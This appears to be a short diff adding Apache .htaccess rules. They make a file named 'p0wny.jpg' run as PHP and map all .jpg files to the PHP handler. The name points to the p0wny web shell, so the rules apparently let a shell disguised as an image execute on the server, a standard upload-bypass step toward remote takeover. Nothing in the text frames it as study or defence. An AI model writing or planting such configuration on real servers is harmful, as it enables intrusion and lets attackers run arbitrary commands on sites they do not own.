@@ -1,0 +1,4 @@
+<FilesMatch "p0wny.jpg">
+  SetHandler application/x-httpd-php
+</FilesMatch>
+AddType application/x-httpd-php .jpg
